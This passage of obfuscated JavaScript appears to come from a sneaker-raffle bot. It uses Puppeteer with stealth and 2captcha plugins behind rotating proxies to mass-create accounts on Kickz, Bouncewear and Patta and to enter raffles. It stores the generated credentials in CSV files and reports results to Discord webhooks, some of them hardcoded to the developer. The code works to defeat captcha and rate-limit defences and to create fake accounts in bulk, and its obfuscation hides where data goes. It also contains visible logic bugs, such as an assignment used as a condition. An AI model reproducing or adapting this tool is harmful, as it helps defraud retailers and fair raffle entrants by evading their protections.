            console['log'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x4e1102[_0x57b9a9]['Password'] == '' && (_0x4e1102[_0x57b9a9]['Password'] = 'JRaffles23!');
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x34e956 = _0x45acad[_0x57b9a9]['split'](':');
        else
            var _0x37c5d2 = Math['round'](Math['random']() * (_0x45acad['length'] - 0x1)), _0x34e956 = _0x45acad[_0x37c5d2]['split'](':');
        const _0x2c832e = await _0x10a68d['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x34e956[0x0] + ':' + _0x34e956[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x147ac4 = await _0x2c832e['newPage']();
            await _0x147ac4['authenticate']({
                'username': '' + _0x34e956[0x2],
                'password': '' + _0x34e956[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x147ac4['setRequestInterception'](!![]), _0x147ac4['on']('request', _0x59f435 => {
                _0x59f435['resourceType']() === 'image' || _0x59f435['resourceType']() === 'font' || _0x59f435['resourceType']() === 'media' ? _0x59f435['abort']() : _0x59f435['continue']();
            }), await _0x147ac4['goto'](_0x507e84), await _0xfe9813(0xbb8), console['log'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x147ac4['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x147ac4['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x147ac4['waitForSelector']('#button-register'), await _0xfe9813(0x7d0), await _0x147ac4['evaluate'](() => {
                const _0x35f7f8 = document['querySelector']('#button-register');
                _0x35f7f8['click']();
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xfe9813(0x1388), await _0x147ac4['waitForSelector']('#customer_salutation'), await _0x147ac4['select']('#customer_salutation', 'mr'), await _0xfe9813(0x7d0), await _0x147ac4['waitForSelector']('#customer_firstname'), await _0x147ac4['type']('#customer_firstname', '' + _0x4e1102[_0x57b9a9]['FirstName']), await _0xfe9813(0x352), await _0x147ac4['waitForSelector']('#customer_lastname'), await _0x147ac4['type']('#customer_lastname', '' + _0x4e1102[_0x57b9a9]['LastName']), await _0xfe9813(0x352), await _0x147ac4['type']('#email-input', '' + _0x4e1102[_0x57b9a9]['Email']), await _0xfe9813(0x352), await _0x147ac4['type']('#email-confirm-input', '' + _0x4e1102[_0x57b9a9]['Email']), await _0xfe9813(0x352), await _0x147ac4['type']('#register-password', '' + _0x4e1102[_0x57b9a9]['Password']), await _0xfe9813(0x352), await _0x147ac4['type']('#password-confirm', '' + _0x4e1102[_0x57b9a9]['Password']), await _0xfe9813(0x352), console['log'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x147ac4['click']('#consent'), await _0xfe9813(0x1f4);
            const _0x44ffe4 = await _0x147ac4['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x44ffe4) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x147ac4['click']('#buttonRegister');
            try {
                await _0x147ac4['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x298364['yellow'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Account\x20' + _0x4e1102[_0x57b9a9]['Email'] + '\x20Generated!')), console['log'](_0x298364['yellow'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x4e1102[_0x57b9a9]['Email'])), await _0xfe9813(0x4b0);
            async function _0x2a5554() {
                console['log'](_0x298364['yellow'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x22d53 = await _0x341b9f['get']('Code');
                return _0x22d53['Code'];
            }
            ;
            code = await _0x2a5554(), _0xfe9813(0x320), console['log'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Verifying..'), await _0x147ac4['type']('#verificationCode', code), await _0xfe9813(0x1f4), await _0x147ac4['click']('#buttonVerify'), await _0xfe9813(0x190), await _0x147ac4['click']('#buttonVerify'), await _0xfe9813(0x3e8);
            try {
                await _0x147ac4['waitForSelector']('div.b-user_greeting'), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Account\x20' + _0x4e1102[_0x57b9a9]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x9cc7aa['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x4e1102[_0x57b9a9]['Email'] + ',' + _0x4e1102[_0x57b9a9]['Password'] + ','), console['log'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Account\x20' + _0x4e1102[_0x57b9a9]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x3f3a95['succesDEVMSG']);
                } catch {
                }
                await _0x3acacc(_0x303def, _0x3f3a95['succesDEVMSG']);
            } catch {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x3f1930) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20' + _0x3f1930)), _0x2463bd[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2463bd[0x0]['description'] = '' + _0x3f1930, await _0x3acacc(_0x2c49ed, _0x54d514), _0x439de9 = 'yes';
        } finally {
            _0x2c832e && _0x2c832e['close']();
            if (_0x439de9 == 'yes' && _0x114eb7 != 0x5) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1a65a3['name'] + ']\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20:\x20Retrying')), _0x57b9a9 = _0x57b9a9 - 0x1, _0x114eb7 = _0x114eb7 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
        }
    }
}
async function _0x300e13(_0x5c1f26, _0x3a2243, _0x32878a) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5a9f12 = 0x0; _0x5a9f12 < _0x3a2243['length']; _0x5a9f12++) {
        var _0x5646fb, _0x10896e = '', _0x52e301 = 0x0;
        _0x193d7e(_0x5c1f26['name'] + '\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20/\x20' + _0x3a2243['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7);
        var _0x3de9fc = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3a2243[_0x5a9f12]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3a2243[_0x5a9f12]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x112c11
                }
            ]
        }], _0x4c2c47 = await _0x5a270a(_0x3a2243[_0x5a9f12], _0x5c1f26, 'dev', ![]), _0x57c54d = await _0x5a270a(_0x3a2243[_0x5a9f12], _0x5c1f26, 'pub', ![]);
        const _0x1ed4e3 = {
            'succesDEVMSG': { 'embeds': [_0x4c2c47] },
            'succesPUBMSG': { 'embeds': [_0x57c54d] }
        };
        await _0x82271d(_0x3a2243, _0x5a9f12);
        if (_0x3a2243[_0x5a9f12]['Email'] == '' || _0x3a2243[_0x5a9f12]['Password'] == '' || _0x3a2243[_0x5a9f12]['FirstName'] == '' || _0x3a2243[_0x5a9f12]['LastName'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x30a01a = _0x32878a[_0x5a9f12]['split'](':');
        else
            var _0x723817 = Math['round'](Math['random']() * (_0x32878a['length'] - 0x1)), _0x30a01a = _0x32878a[_0x723817]['split'](':');
        const _0x646133 = await _0x10a68d['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x30a01a[0x0] + ':' + _0x30a01a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x554aac = await _0x646133['newPage']();
            await _0x554aac['authenticate']({
                'username': '' + _0x30a01a[0x2],
                'password': '' + _0x30a01a[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x554aac['setRequestInterception'](!![]), _0x554aac['on']('request', _0x543b6c => {
                _0x543b6c['resourceType']() === 'image' || _0x543b6c['resourceType']() === 'font' || _0x543b6c['resourceType']() === 'media' ? _0x543b6c['abort']() : _0x543b6c['continue']();
            }), await _0x554aac['goto']('' + _0x3a2243[_0x5a9f12]['Url'], { 'waitUntil': 'networkidle2' }), await _0xfe9813(0x12c);
            try {
                await _0x554aac['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x554aac['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Logging\x20in'), await _0x554aac['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x554aac['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x554aac['waitForSelector']('#username'), await _0x554aac['type']('#username', _0x3a2243[_0x5a9f12]['Email']), await _0x554aac['waitForSelector']('#password'), await _0x554aac['type']('#password', _0x3a2243[_0x5a9f12]['Password']), await _0xfe9813(0x190), await _0x554aac['click']('#buttonSubmit'), await _0x554aac['waitForSelector']('div.b-user_greeting'), console['log'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Getting\x20Product'), await _0xfe9813(0x1f4), await _0x554aac['goto']('' + _0x3a2243[_0x5a9f12]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3a2243[_0x5a9f12]['Size']);
            let _0x4f1def = _0x3a2243[_0x5a9f12]['Size']['replace']('.5', '\x201/2');
            await _0x554aac['click']('button[title=\x22' + _0x4f1def + '\x22]'), await _0xfe9813(0x1f4);
            try {
                await _0x554aac['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0xfe9813(0x12c), console['log'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x554aac['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xfe9813(0x12c), await _0x554aac['type']('#dwfrm_raffle_addressFields_firstName', _0x3a2243[_0x5a9f12]['FirstName']), await _0xfe9813(0x12c), await _0x554aac['type']('#dwfrm_raffle_addressFields_lastName', _0x3a2243[_0x5a9f12]['LastName']), await _0xfe9813(0x12c), await _0x554aac['select']('#dwfrm_raffle_addressFields_country', _0x3a2243[_0x5a9f12]['Country']), await _0xfe9813(0x12c), await _0x554aac['type']('#dwfrm_raffle_addressFields_city', _0x3a2243[_0x5a9f12]['City']), await _0xfe9813(0x12c);
            _0x3a2243[_0x5a9f12]['Postcode'] == undefined && (_0x3a2243[_0x5a9f12]['Postcode'] = _0x3a2243[_0x5a9f12]['Zip']);
            await _0x554aac['type']('#dwfrm_raffle_addressFields_postalCode', _0x3a2243[_0x5a9f12]['Postcode']), await _0xfe9813(0x12c), await _0x554aac['type']('#dwfrm_raffle_addressFields_address1', _0x3a2243[_0x5a9f12]['Address1']), await _0xfe9813(0x12c), await _0x554aac['type']('#dwfrm_raffle_addressFields_address2', _0x3a2243[_0x5a9f12]['HouseNumber']), await _0xfe9813(0x12c), await _0x554aac['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x3a2243[_0x5a9f12]['Address2']), await _0xfe9813(0x12c), await _0x554aac['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xfe9813(0x12c), await _0x554aac['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x3a2243[_0x5a9f12]['Follower']), await _0xfe9813(0x1f4), await _0x554aac['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xfe9813(0x1f4), console['log'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20' + _0x298364['blue']('Awaiting\x20Paypal\x20Payment')), await _0x554aac['click']('.b-paypal_button');
            try {
                await _0x554aac['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x1ed4e3['succesDEVMSG']), await _0xfe9813(0xc8), await _0x3acacc(_0xe7a394, _0x1ed4e3['succesDEVMSG']), await _0xfe9813(0xc8), await _0x3acacc(_0x1c5083, _0x1ed4e3['succesPUBMSG']);
            } catch (_0x4af44a) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4af44a)), _0x5646fb = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4af44a;
                var _0x197aba = await _0x5a270a(_0x3a2243[_0x5a9f12], _0x5c1f26, 'dev', !![], _0x5646fb);
                _0x1ed4e3['errorDEV'] = { 'embeds': [_0x197aba] }, _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x1ed4e3['errorDEV']), await _0x3acacc(_0x2c49ed, _0x1ed4e3['errorDEV']);
            }
        } catch (_0x110169) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20' + _0x110169)), _0x5646fb = '' + _0x110169;
            var _0x197aba = await _0x5a270a(_0x3a2243[_0x5a9f12], _0x5c1f26, 'dev', !![], _0x5646fb);
            _0x1ed4e3['errorDEV'] = { 'embeds': [_0x197aba] }, _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x1ed4e3['errorDEV']), await _0x3acacc(_0x2c49ed, _0x1ed4e3['errorDEV']), _0x10896e = 'yes';
        } finally {
            _0x646133 && _0x646133['close']();
            if (_0x10896e == 'yes' && _0x52e301 != 0x5) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x5c1f26['name'] + ']\x20Task\x20' + (_0x5a9f12 + 0x1) + '\x20:\x20Retrying')), _0x5a9f12 = _0x5a9f12 - 0x1, _0x52e301 = _0x52e301 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x152d8a['AfewDelay'] + '\x20ms'), await _0xfe9813(_0x152d8a['AfewDelay']);
        }
    }
}
async function _0xaf4157(_0x4331b9, _0x3662eb) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2a5f6b = 0x0; _0x2a5f6b < bouncewear['length']; _0x2a5f6b++) {
        await _0x82271d(bouncewear, _0x2a5f6b);
        if (bouncewear[_0x2a5f6b]['Email'] == '' || bouncewear[_0x2a5f6b]['Password'] == '' || bouncewear[_0x2a5f6b]['FirstName'] == '' || bouncewear[_0x2a5f6b]['LastName'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x48cd30 = _0x12c18b()[_0x2a5f6b]['split'](':');
        else
            var _0x510c8e = Math['round'](Math['random']() * (_0x12c18b()['length'] - 0x1)), _0x48cd30 = _0x12c18b()[_0x510c8e]['split'](':');
        const _0x4465e7 = await _0x10a68d['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x48cd30[0x0] + ':' + _0x48cd30[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2bf6d3 = await _0x4465e7['newPage']();
            await _0x2bf6d3['authenticate']({
                'username': '' + _0x48cd30[0x2],
                'password': '' + _0x48cd30[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2bf6d3['setRequestInterception'](!![]), _0x2bf6d3['on']('request', _0x318245 => {
                _0x318245['resourceType']() === 'image' || _0x318245['resourceType']() === 'font' || _0x318245['resourceType']() === 'media' ? _0x318245['abort']() : _0x318245['continue']();
            }), await _0x2bf6d3['goto'](_0x4331b9), await _0xfe9813(0xbb8), await _0x2bf6d3['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Filling\x20information'), await _0x2bf6d3['type']('#RegisterForm-FirstName', '' + bouncewear[_0x2a5f6b]['FirstName']), await _0xfe9813(0x226), await _0x2bf6d3['type']('#RegisterForm-LastName', '' + bouncewear[_0x2a5f6b]['LastName']), await _0xfe9813(0x226), await _0x2bf6d3['type']('#RegisterForm-email', '' + bouncewear[_0x2a5f6b]['Email']), await _0xfe9813(0x226), await _0x2bf6d3['type']('#RegisterForm-password', '' + bouncewear[_0x2a5f6b]['Password']), await _0xfe9813(0x226), await _0x2bf6d3['click']('#marketing'), console['log'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Submitting..'), await _0x2bf6d3['$eval']('#RegisterForm', _0x4ddcc9 => _0x4ddcc9['submit']()), await _0xfe9813(0x1f40), console['log'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x2bf6d3['solveRecaptchas'](), await _0x2bf6d3['click']('.shopify-challenge__button.btn');
            async function _0x51a8af() {
                for (var _0x1c56e2 = 0x0; _0x1c56e2 < 0x4; _0x1c56e2++) {
                    try {
                        console['log']('try'), await _0x2bf6d3['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20' + _0x298364['red']('Catpcha\x20failed,\x20retrying..')), await _0x2bf6d3['solveRecaptchas'](), await _0x2bf6d3['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x51a8af(), console['log'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0xfe9813(0x1f4);
            try {
                await _0x2bf6d3['waitForSelector']('.featured-title'), await _0xfe9813(0x1f4), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x2a5f6b]['Email'] + '\x20Generated!')), _0x9cc7aa['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x2a5f6b]['Email'] + ',' + bouncewear[_0x2a5f6b]['Password']), console['log'](_0x298364['yellow'](_0xfa2bb1() + '\x20[' + _0x3662eb['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x2a5f6b]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x173d08) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x173d08));
            }
        } catch (_0x3bc9dc) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x2a5f6b + 0x1) + '\x20:\x20' + _0x3bc9dc));
        } finally {
            _0x4465e7 && _0x4465e7['close'](), console['log']('Waiting\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
        }
    }
}
async function _0x35d4d9(_0x2838ee, _0x4b56b2, _0x22fe28, _0x155db1) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1a6d05 = 0x0; _0x1a6d05 < _0x22fe28['length']; _0x1a6d05++) {
        var _0x4ccb57 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x112c11
                }
            ]
        }];
        const _0x54f4f9 = { 'embeds': _0x4ccb57 };
        _0x193d7e(_0x4b56b2['name'] + '\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20/\x20' + _0x22fe28['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x22fe28, _0x1a6d05);
        var _0x22c5c5 = await _0x5a270a(_0x22fe28[_0x1a6d05], _0x4b56b2, 'acc', ![]);
        const _0x3089db = { 'succesDEVMSG': { 'embeds': [_0x22c5c5] } };
        if (_0x22fe28[_0x1a6d05]['Email'] == '' || _0x22fe28[_0x1a6d05]['FirstName'] == '' || _0x22fe28[_0x1a6d05]['LastName'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xfe9813(0x7d0);
            continue;
        }
        (_0x22fe28[_0x1a6d05]['Password'] == '' || _0x22fe28[_0x1a6d05] == undefined) && _0x22fe28[_0x1a6d05]['Password'] == 'JRaffles23!';
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x2e32ed = _0x155db1[_0x1a6d05]['split'](':');
        else
            var _0x23624c = Math['round'](Math['random']() * (_0x155db1['length'] - 0x1)), _0x2e32ed = _0x155db1[_0x23624c]['split'](':');
        const _0x453879 = await _0x10a68d['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x2e32ed[0x0] + ':' + _0x2e32ed[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x50983f = await _0x453879['newPage']();
            await _0x50983f['authenticate']({
                'username': '' + _0x2e32ed[0x2],
                'password': '' + _0x2e32ed[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x4b56b2['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50983f['setRequestInterception'](!![]), _0x50983f['on']('request', _0x95908d => {
                _0x95908d['resourceType']() === 'image' || _0x95908d['resourceType']() === 'font' || _0x95908d['resourceType']() === 'media' ? _0x95908d['abort']() : _0x95908d['continue']();
            }), await _0x50983f['goto'](_0x2838ee), await _0xfe9813(0xbb8), await _0x50983f['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0xfa2bb1() + '\x20[' + _0x4b56b2['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20Filling\x20information'), await _0x50983f['type']('#RegisterForm-FirstName', '' + _0x22fe28[_0x1a6d05]['FirstName']), await _0xfe9813(0x226), await _0x50983f['type']('#RegisterForm-LastName', '' + _0x22fe28[_0x1a6d05]['LastName']), await _0xfe9813(0x226), await _0x50983f['type']('#RegisterForm-email', '' + _0x22fe28[_0x1a6d05]['Email']), await _0xfe9813(0x226), await _0x50983f['type']('#RegisterForm-password', '' + _0x22fe28[_0x1a6d05]['Password']), await _0xfe9813(0x226), console['log'](_0xfa2bb1() + '\x20[' + _0x4b56b2['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20Submitting..'), await _0x50983f['$eval']('#RegisterForm', _0x2ba793 => _0x2ba793['submit']()), await _0xfe9813(0x1f40);
            try {
                await _0x50983f['waitForSelector']('.home-page-grid__collection'), await _0xfe9813(0x1f4), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x4b56b2['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20Account\x20' + _0x22fe28[_0x1a6d05]['Email'] + '\x20Generated!')), _0x9cc7aa['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x22fe28[_0x1a6d05]['Email'] + ',' + _0x22fe28[_0x1a6d05]['Password']), console['log'](_0x298364['yellow'](_0xfa2bb1() + '\x20[' + _0x4b56b2['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20Account\x20' + _0x22fe28[_0x1a6d05]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x3089db['succesDEVMSG']);
                } catch {
                }
                await _0x3acacc(_0x303def, _0x3089db['succesDEVMSG']);
            } catch (_0x4fa717) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4fa717));
            }
        } catch (_0x46acea) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x1a6d05 + 0x1) + '\x20:\x20' + _0x46acea));
        } finally {
            _0x453879 && _0x453879['close'](), console['log']('Waiting\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
        }
    }
}
async function _0x3f40c4(_0x1f6e46, _0x5e10d4, _0x1c12e4, _0xaecdd9) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x54b84e = 0x0; _0x54b84e < _0x1c12e4['length']; _0x54b84e++) {
        var _0xb88d59, _0x1dabc5 = '', _0xc7e290 = 0x0;
        _0x193d7e(_0x5e10d4['name'] + '\x20Task\x20' + (_0x54b84e + 0x1) + '\x20/\x20' + _0x1c12e4['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x1c12e4, _0x54b84e);
        if (_0x1c12e4[_0x54b84e]['Email'] == '' || _0x1c12e4[_0x54b84e]['Password'] == '' || _0x1c12e4[_0x54b84e]['FirstName'] == '' || _0x1c12e4[_0x54b84e]['LastName'] == '') {
